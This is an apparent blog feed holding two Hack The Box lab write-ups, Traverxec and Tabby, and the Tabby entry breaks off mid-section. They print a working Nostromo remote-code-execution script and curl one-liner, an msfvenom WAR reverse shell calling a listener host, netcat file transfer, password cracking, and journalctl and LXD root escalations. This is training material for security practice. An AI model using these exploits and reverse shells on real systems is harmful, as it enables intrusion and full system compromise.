<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-23T14:04:17+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Traverxec</title><link href="http://localhost:4000/2022/08/25/Traverxec.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Traverxec" /><published>2022-08-25T00:00:00+02:00</published><updated>2022-08-25T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/25/Traverxec</id><content type="html" xml:base="http://localhost:4000/2022/08/25/Traverxec.html"><![CDATA[<p><img src="/assets/Traverxec/Traverxec.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Traverxec</strong> is a <strong>Linux</strong> machine hosting a <strong>web server</strong> called <strong>Nostromo</strong> and has <strong>SSH</strong> port open.</li>
  <li>The <strong>response headers</strong> from the webserver <strong>reveal its name and version</strong> which happens to be <strong>vulnerable to a Remote Code Execution vulnerability.</strong></li>
  <li><em>After troubleshooting the exploit and making a few modifications,</em> we get <strong>a shell</strong> as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</li>
  <li><em>One the box, when going through the files</em> <strong><em>in the webroot,</em></strong> we find the <strong>Nostromo server’s configuration file.</strong></li>
  <li>It reveals that there’s <strong>an accessible area</strong> within the <code class="language-plaintext highlighter-rouge">david</code> user’s <strong>home directory</strong>. <em>There,</em> we find a <strong>private SSH key</strong> which was <strong>protected by a passphrase.</strong></li>
  <li>We manage to <strong>crack it</strong> using <code class="language-plaintext highlighter-rouge">john</code> and are able to <strong>login as</strong> <code class="language-plaintext highlighter-rouge">david</code>.</li>
  <li><em>In</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s home path</em>, we find a <strong>folder containing a Bash script</strong> that issues a <code class="language-plaintext highlighter-rouge">journalctl</code> command with <code class="language-plaintext highlighter-rouge">sudo</code> <strong>privileges</strong> without requiring a password. We <strong>exploit that to get a shell</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p><em>from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output,</em> we notice from the <code class="language-plaintext highlighter-rouge">http-server-header</code> script that the web server is <strong>Nostromo version 1.9.6.</strong></p>

<p><em>but before we check for exploits,</em> we’ll first <strong>take a look at the website</strong> to see what’s there.</p>

<h2 id="the-website">The website</h2>
<p><img src="/assets/Traverxec/website-home-page.jpg" alt="" /></p>

<p><strong>static content</strong> for the most. Let’s move on :D</p>

<h2 id="searching-and-fixing-exploits">Searching and Fixing Exploits</h2>
<p>using <code class="language-plaintext highlighter-rouge">searchsploit</code> gets us <strong>two identical matches.</strong></p>

<p><img src="/assets/Traverxec/searchsploit.jpg" alt="" /></p>

<p><em>to go manual,</em> we pick the <strong>2nd Python script</strong> and <strong>look at the exploit code</strong> <em>(after removing the text art for clarity)</em></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="n">help_menu</span> <span class="o">=</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">Usage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;'</span>

<span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">connection</span> <span class="o">=</span> <span class="n">soc</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">connection</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">response</span> <span class="o">+=</span> <span class="n">connection</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">return</span> <span class="n">response</span>

<span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>

        <span class="n">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>

    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">help_menu</span><span class="p">)</span>
</code></pre></div></div>

<p>it seems straightforward. Just a <strong>TCP connection</strong> and a <strong>POST request</strong>. Let’s give it a try:</p>

<p><img src="/assets/Traverxec/exploit-error.jpg" alt="" /></p>

<p>we get <strong>an error</strong> when running the code :/ But we <em>shouldn’t worry</em> when we’ve got <strong>Google</strong> :)</p>

<p>we search <strong>using the error message as a query</strong>. To find this answer on <a href="https://stackoverflow.com/questions/33054527/typeerror-a-bytes-like-object-is-required-not-str-when-writing-to-a-file-in">Stack Overflow</a>:</p>

<p><img src="/assets/Traverxec/stack-overflow-answer.jpg" alt="" /></p>

<p><em>following that,</em> we <strong>modify the code</strong> accordingly</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>  <span class="c1"># previously soc.send(payload)
</span>    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>
</code></pre></div></div>

<p>then <strong>rerun the exploit</strong></p>

<p><img src="/assets/Traverxec/no-feedback-exploit.jpg" alt="" /></p>

<p><strong>no feedback</strong> at all this time xD</p>

<p><em>But,</em> <strong><em>no feedback doesn’t necessarily mean no effect</em></strong></p>

<p><em>for blind situations like these</em>: it’s good to use something like <code class="language-plaintext highlighter-rouge">wget</code> to <strong>verify code execution.</strong></p>

<p><img src="/assets/Traverxec/code-execution-verified.jpg" alt="" /></p>

<p><strong>we’re good :D</strong> let’s get in with a <strong>netcat reverse shell.</strong></p>

<p><img src="/assets/Traverxec/got-shell.jpg" alt="" /></p>

<p><em>before going any further,</em> it’s nice to <strong>improve our shell</strong>. it’s done in the below steps:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># With whatever Python version you find, import the pty module and spawn a bash pty</span>
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span> <span class="o">||</span> python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
<span class="c"># Press CTRL + Z</span>
<span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="nb">fg</span>
<span class="c"># Press Enter twice</span>
<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash <span class="o">&amp;&amp;</span> <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
<span class="c"># that's the size that fits my terminal. you can find yours with "stty size"</span>
<span class="nb">stty </span>rows 51 columns 228
</code></pre></div></div>

<h2 id="the-nostromo-config-file">The Nostromo config file</h2>
<p><em>Right after logging in,</em> we go into <code class="language-plaintext highlighter-rouge">/var/nostromo</code> and find a <strong>configuration file</strong> in the <code class="language-plaintext highlighter-rouge">conf</code> folder.</p>

<p><img src="/assets/Traverxec/nostromo-conf.jpg" alt="" /></p>

<p>A <strong>couple of interesting things</strong> show up:</p>
<ul>
  <li>a username: <code class="language-plaintext highlighter-rouge">david</code></li>
  <li>an <code class="language-plaintext highlighter-rouge">.htpasswd</code> file</li>
  <li>and a section on <code class="language-plaintext highlighter-rouge">HOMEDIRS</code></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">david</code> was a <strong>local user</strong> on the system</p>

<p><img src="/assets/Traverxec/david-passwd.jpg" alt="" /></p>

<p>the <code class="language-plaintext highlighter-rouge">.htpasswd</code> file contains a hash. we <strong>cracked it</strong> with <code class="language-plaintext highlighter-rouge">john</code> and got a password:</p>

<p><img src="/assets/Traverxec/htpasswd-cracked.jpg" alt="" /></p>

<p>But that password <em>didn’t work</em> for either <code class="language-plaintext highlighter-rouge">root</code> or <code class="language-plaintext highlighter-rouge">david</code>.</p>

<p><img src="/assets/Traverxec/no-cred-reuse-for-htpassword.jpg" alt="" /></p>

<p>we keep it around just in case..</p>

<h2 id="understanding-the-homedirs-feature">Understanding the HOMEDIRS feature</h2>
<p><em>previously,</em> we attempted to list the contents of <code class="language-plaintext highlighter-rouge">david</code>’s profile but got denied access.</p>

<p><img src="/assets/Traverxec/david-perm-denied.jpg" alt="" /></p>

<p><em>since the</em> <code class="language-plaintext highlighter-rouge">HOMEDIRS</code> <em>feature would give us access into</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s directory,</em> we take <strong>a quick look</strong> at the <a href="https://www.nazgul.ch/dev/nostromo_man.html">online documentation</a> to understand how to use it:</p>

<p><strong>note:</strong> <em>to make the page clearer for reading,</em> you may <strong>edit the CSS</strong> for the man page using the <strong>Chrome Dev Tools.</strong></p>

<p><img src="/assets/Traverxec/editing-site-css-for-clarity.jpg" alt="" /></p>

<p><em>Scrolling down to the</em> <code class="language-plaintext highlighter-rouge">HOMEDIRS</code> <em>section,</em> we find an example showing that <strong>we can access a user’s folder over HTTP</strong> using the <code class="language-plaintext highlighter-rouge">~</code> followed by the <code class="language-plaintext highlighter-rouge">username</code>.</p>

<p>another thing is: users <strong>can define a certain directory to be shared</strong> through the <code class="language-plaintext highlighter-rouge">homedirs_public</code> option.</p>

<p><img src="/assets/Traverxec/homedirs_explained.jpg" alt="" /></p>

<p>we saw that one in <code class="language-plaintext highlighter-rouge">nhttpd.conf</code></p>

<p><img src="/assets/Traverxec/public_www.jpg" alt="" /></p>

<p>let’s first check the home directory <strong><em>from the outside</em></strong></p>

<p><img src="/assets/Traverxec/home-dir-website.jpg" alt="" /></p>

<p>there’s nothing in both the <strong>web page</strong> and the <strong>source code.</strong></p>

<p>a <code class="language-plaintext highlighter-rouge">gobuster</code> <strong>brute force</strong> didn’t get us anything new either.</p>

<p><em>Locally on the file system, since the</em> <code class="language-plaintext highlighter-rouge">public_www</code> <em>folder</em> <strong>should be</strong> <em>in</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s home directory,</em> we tried to <strong><em>blindly</em></strong> change into it.</p>

<p><img src="/assets/Traverxec/public_www-violated.jpg" alt="" /></p>

<p><strong>it worked!</strong> plus we found something that could give us access.</p>

<p>we <strong>copied the archive</strong> to <code class="language-plaintext highlighter-rouge">/tmp</code> where we <strong>extracted</strong> it. <em>Inside,</em> we found a <strong>protected</strong> <code class="language-plaintext highlighter-rouge">id_rsa</code> that we need to crack:</p>

<p><img src="/assets/Traverxec/id_rsa_found.jpg" alt="" /></p>

<p>we first <strong>convert</strong> it to a hash using <code class="language-plaintext highlighter-rouge">ssh2john</code> and <strong>crack it</strong> using <code class="language-plaintext highlighter-rouge">john</code> to get a password: “hunter”</p>

<p><img src="/assets/Traverxec/id_rsa_cracked.jpg" alt="" /></p>

<p>we later <strong>change the permissions</strong> on the SSH key (<code class="language-plaintext highlighter-rouge">chmod 600 &lt;KEY_FILE&gt;</code>) and use it to access the machine as <code class="language-plaintext highlighter-rouge">david</code></p>

<p><img src="/assets/Traverxec/ssh-as-david.jpg" alt="" /></p>

<h2 id="exploiting-sudo-journalctl-for-privesc">Exploiting SUDO journalctl for Privesc</h2>
<p><em>Right after logging in,</em> we see <strong>a folder that sticks out</strong>: <code class="language-plaintext highlighter-rouge">bin</code></p>

<p>it had a script <code class="language-plaintext highlighter-rouge">server-status.sh</code> and another file called <code class="language-plaintext highlighter-rouge">server-stats.head</code></p>

<p><img src="/assets/Traverxec/bin-folder-plus-script.jpg" alt="" /></p>

<p>looking at their contents:</p>

<p><img src="/assets/Traverxec/bin-files-breakdown.jpg" alt="" /></p>

<p>the <code class="language-plaintext highlighter-rouge">server-stats.head</code> was just <strong>ASCII art.</strong></p>

<p>But, within <code class="language-plaintext highlighter-rouge">server-status.sh</code> are all <strong>commands for checking the status of the Nostromo server</strong> <em>just like the name says</em></p>

<p>the <strong>exploitable part</strong> here is the <code class="language-plaintext highlighter-rouge">sudo</code> command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
</code></pre></div></div>

<p>that’s because <code class="language-plaintext highlighter-rouge">journalctl</code> <strong><em>can be escaped for a shell with the same privileges</em></strong>.</p>

<p>A quick look on <a href="https://gtfobins.github.io/gtfobins/journalctl/#sudo">GTFOBins</a> can confirm that.</p>

<p><img src="/assets/Traverxec/gtfo-bins-journalctl.jpg" alt="" /></p>

<p>the trick is that it <strong><em>“invokes the default pager”.</em></strong></p>

<p>A pager is a <strong>program</strong> that <strong>helps the user view the output of a command</strong> <strong><em>one page at a time</em></strong>.
This is done by <strong>getting the size of rows of the terminal</strong> and <strong>only displaying that many lines.</strong></p>

<p>Paging tools you’re probably familiar with are <code class="language-plaintext highlighter-rouge">more</code> and <code class="language-plaintext highlighter-rouge">less</code>. Both of which can be <strong><em>escaped for a shell</em></strong> ;]</p>

<p>Let’s first <strong>run the script</strong> to see <em>if it asks for a password or not.</em></p>

<p><img src="/assets/Traverxec/script-test-run.jpg" alt="" /></p>

<p>It ran <strong><em>without prompting us for authentication.</em></strong></p>

<p>That’s good. the command <code class="language-plaintext highlighter-rouge">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> is available for <code class="language-plaintext highlighter-rouge">david</code> without him needing to provide a password.</p>

<p><em>To exploit this,</em> we run the command. <strong><em>But because the output is too small,</em></strong> <strong>the pager isn’t called.</strong></p>

<p><img src="/assets/Traverxec/no-pager-invoked.jpg" alt="" /></p>

<p>We use <code class="language-plaintext highlighter-rouge">stty</code> as a quick-and-dirty trick to <strong>shrink our tty.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>rows 20 columns 20
</code></pre></div></div>

<p><img src="/assets/Traverxec/pager-invoked.jpg" alt="" /></p>

<p><em>From the highlighted line,</em> we know <strong>we have a pager</strong> which can be <strong>turned into a bash shell</strong> with <code class="language-plaintext highlighter-rouge">!/bin/bash</code></p>

<p><img src="/assets/Traverxec/rooted.jpg" alt="" /></p>

<p><strong>Owned :D</strong></p>

<h2 id="rewriting-the-nostromo-exploit">Rewriting the Nostromo exploit</h2>
<p><em>After some brief testing, and</em> <strong><em>for the sake of simplicity,</em></strong> we <strong>re-wrote the the exploit</strong> for Nostromo as a <code class="language-plaintext highlighter-rouge">curl</code> one-liner:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="nt">-H</span> <span class="s1">$'Content-Length: 1'</span> <span class="nt">--data-binary</span> <span class="s1">$'</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0a&lt;COMMAND&gt;'</span> <span class="s1">$'http://&lt;HOSTNAME&gt;:&lt;PORT&gt;/.%0d./.%0d./.%0d./.%0d./bin/sh'</span> <span class="o">&gt;</span>/dev/null
</code></pre></div></div>

<p><img src="/assets/Traverxec/exploit-rewritten.jpg" alt="" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Easy] - Tabby</title><link href="http://localhost:4000/2022/08/24/Tabby.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Tabby" /><published>2022-08-24T00:00:00+02:00</published><updated>2022-08-24T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/24/Tabby</id><content type="html" xml:base="http://localhost:4000/2022/08/24/Tabby.html"><![CDATA[<p><img src="/assets/Tabby/Tabby.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Tabby</strong> is a <strong>linux</strong> machine hosting both <strong>Apache web server</strong> and <strong>Tomcat</strong>.</li>
  <li>The website on port 80 had a <strong>Directory Traversal vulnerability</strong> which enabled us to <strong>read a Tomcat configuration file</strong> which <strong>contained valid credentials.</strong></li>
  <li><em>Using those,</em> we <strong>get a user with enough privileges to upload a WAR file containing a reverse shell</strong>. <em>And, with it</em>, we <strong>access the box</strong> as the <code class="language-plaintext highlighter-rouge">tomcat</code> user.</li>
  <li>We find an <strong>encrypted backup archive in the webroot</strong>. We <strong>crack it</strong> with <code class="language-plaintext highlighter-rouge">john</code> to <strong>get a password.</strong></li>
  <li>The password was <em>being reused</em> by another user on the box (<code class="language-plaintext highlighter-rouge">ash</code>) who happened to be <strong>a member of the <code class="language-plaintext highlighter-rouge">lxd</code> group.</strong></li>
  <li>We <strong>escalate our privileges</strong> to <code class="language-plaintext highlighter-rouge">root</code> by <strong>creating a specially-configured container</strong>.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us areas to check:</p>
<ul>
  <li>the <strong>website on port 80</strong></li>
  <li>and the <strong>Tomcat instance on port 8080</strong></li>
  <li><strong>SSH</strong> would come in handy if we get any creds</li>
</ul>

<h2 id="port-80">Port 80</h2>
<p>The home page here was mostly <strong>static content</strong>.</p>

<p><img src="/assets/Tabby/homepage-port-80.jpg" alt="" /></p>

<p><em>except for</em> the <strong>link for the “News” page.</strong></p>

<p>note: <em>on the link below</em>, notice <em>how the host name changed</em> to <strong>“megahosting.htb”</strong></p>

<p><img src="/assets/Tabby/virtual-host-routing.jpg" alt="" /></p>

<p>an entry in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> will take care of this <strong>Virtual Host Routing</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.194 megahosting.htb
</code></pre></div></div>

<p>we also notice that <code class="language-plaintext highlighter-rouge">news.php</code> handles <strong>a parameter</strong> called <code class="language-plaintext highlighter-rouge">file</code>. this looks like a <strong>file inclusion vulnerability.</strong></p>

<p><img src="/assets/Tabby/lfi-spotted.jpg" alt="" /></p>

<p>trying <code class="language-plaintext highlighter-rouge">/etc/passwd</code> in the parameter doesn’t work.</p>

<p>but going <strong>4 directories back</strong> with <code class="language-plaintext highlighter-rouge">../../../../</code> gets us the <strong>confirmation</strong> we need.</p>

<p><img src="/assets/Tabby/lfi-confirmed.jpg" alt="" /></p>

<p><em>after a couple of tries to get the path right,</em> we are able to <strong>get the source code</strong> of the <code class="language-plaintext highlighter-rouge">news.php</code> file:</p>

<p><img src="/assets/Tabby/news-php-src-code.jpg" alt="" /></p>

<p>the <code class="language-plaintext highlighter-rouge">fopen</code> function here makes this a <strong>Directory/Path Traversal vulnerability</strong> and <strong>not a Local File Inclusion.</strong></p>

<p>that’s because <code class="language-plaintext highlighter-rouge">fopen</code> just <strong>reads a file’s contents</strong>. it <strong>doesn’t evaluate PHP code</strong> like <code class="language-plaintext highlighter-rouge">include</code> or <code class="language-plaintext highlighter-rouge">require</code></p>

<p><strong><em>Knowing this bit spares us the effort of trying to get code execution by including PHP.</em></strong></p>

<h2 id="reading-sensitive-files">Reading Sensitive Files</h2>
<p><em>As a quick check,</em> we try to read the <code class="language-plaintext highlighter-rouge">ash</code> user’s <strong>private SSH key</strong> (<code class="language-plaintext highlighter-rouge">/home/ash/.ssh/id_rsa</code>). But it’s <em>not that easy</em> :)</p>

<p>We then think “maybe we should take a look at tomcat before diving any deeper here”. Just in case..</p>

<p><img src="/assets/Tabby/tomcat-homepage.jpg" alt="" /></p>

<p>We get some <strong>decent information</strong> from this page. the <strong>webroot</strong> and <strong>where Tomcat is installed.</strong></p>

<p><em>But, when it comes to sensitive files,</em> there’s <strong>a very important one</strong> called <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code>. it’s in <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/</code> by default.</p>

<p>We found it there and got <strong>creds for a user</strong> with <strong>very nice privileges</strong> :]</p>

<p><img src="/assets/Tabby/reading-tomcat-users-xml.jpg" alt="" /></p>

<h2 id="exploiting-our-tomcat-privileges-for-rce">Exploiting our Tomcat Privileges for RCE</h2>
<p>The <code class="language-plaintext highlighter-rouge">manager-script</code> role has access to <strong>upload WAR files.</strong></p>

<p>to abuse this, we will generate a <strong>WAR reverse shell</strong> with <code class="language-plaintext highlighter-rouge">msfvenom</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.3 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> war <span class="nt">-o</span> revvy.war
</code></pre></div></div>

<p><img src="/assets/Tabby/creating-a-war-file.jpg" alt="" /></p>

<p>then <strong>upload the WAR file</strong> using <code class="language-plaintext highlighter-rouge">curl</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-u</span> tomcat:<span class="s1">'$3cureP4s5w0rd123!'</span> <span class="nt">-T</span> revvy.war <span class="s2">"http://tabby:8080/manager/text/deploy?path=/shell&amp;update=true"</span>
</code></pre></div></div>

<p>start up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on port 9000</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9000
</code></pre></div></div>

<p>and <code class="language-plaintext highlighter-rouge">curl</code> the endpoint to hit and trigger our reverse shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://tabby:8080/shell
</code></pre></div></div>

<p><img src="/assets/Tabby/shell-as-tomcat.jpg" alt="" /></p>

<p>we’re in as <code class="language-plaintext highlighter-rouge">tomcat</code> :)</p>

<h2 id="pivoting-via-password-reuse">Pivoting via Password Reuse</h2>

<p><em>Right after improving our shell,</em> we start with <strong>checking the files</strong> in <code class="language-plaintext highlighter-rouge">/var/www/html</code></p>

<p>there was a folder called <code class="language-plaintext highlighter-rouge">files</code>. It contained a <strong>password-protected zip archive</strong> that was <strong>owned by</strong> the <code class="language-plaintext highlighter-rouge">ash</code> user.</p>

<p><img src="/assets/Tabby/finding-ashes-zip-file.jpg" alt="" /></p>

<p>we <strong>transfer it over</strong> to our kali using <code class="language-plaintext highlighter-rouge">netcat</code> so we can <strong>crack</strong> it</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># on tabby</span>
nc <span class="nt">-lvnp</span> 5000 &lt; 16162020_backup.zip
<span class="c"># on our kali</span>
nc tabby 5000 <span class="o">&gt;</span> ash_backup.zip
</code></pre></div></div>

<p><em>and, to verify that the file wasn’t corrupted in-transit,</em> we do a quick <strong>integrity check</strong> using <code class="language-plaintext highlighter-rouge">md5sum</code>.</p>

<p><img src="/assets/Tabby/transferring-zip-file.jpg" alt="" /></p>

<p>we use <code class="language-plaintext highlighter-rouge">zip2john</code> to <strong>get a hash</strong> for <code class="language-plaintext highlighter-rouge">john</code> to crack.</p>

<p><img src="/assets/Tabby/zip-password.jpg" alt="" /></p>

<p>it successfully cracked. but we <em>didn’t find anything important</em> within the archive itself.</p>

<p><img src="/assets/Tabby/zip-files.jpg" alt="" /></p>

<p>the files were practically <strong><em>the same as the original ones.</em></strong></p>

<p><em>But, since we now had a password,</em> we tried it against <code class="language-plaintext highlighter-rouge">ash</code> and <code class="language-plaintext highlighter-rouge">root</code></p>

<p>it didn’t work with <code class="language-plaintext highlighter-rouge">root</code>, but <strong>did</strong> with <code class="language-plaintext highlighter-rouge">ash</code> :)</p>

<p><img src="/assets/Tabby/logged-in-as-ash.jpg" alt="" /></p>

<h2 id="lxd-privilege-escalation">LXD Privilege Escalation</h2>
<p><em>As you may have noticed from the previous image,</em> <code class="language-plaintext highlighter-rouge">ash</code> is part of the <code class="language-plaintext highlighter-rouge">lxd</code> group</p>

<p><img src="/assets/Tabby/lxd-group-membership.jpg" alt="" /></p>

<p>this is <em>almost exactly the same situation</em> as in the <a href="https://omnisl4sh.github.io/2022/08/17/Brainfuck.html#lxd-privilege-escalation">Brainfuck Privesc</a>.</p>

<p>one <em>minor difference</em> is that <strong>we have to initialize the LX daemon</strong> with <code class="language-plaintext highlighter-rouge">lxd init</code> before importing the image.</p>

<p>note: also make sure to add <code class="language-plaintext highlighter-rouge">/snap/bin</code> to the <code class="language-plaintext highlighter-rouge">PATH</code> environment variable as <em>it’s not there by default.</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/snap/bin/
</code></pre></div></div>

<p><img src="/assets/Tabby/lxd-init.jpg" alt="" /></p>

<p><em>for a bit of automation,</em> we’re going to throw the commands into a <strong>bash script</strong>. here are the contents:</p>

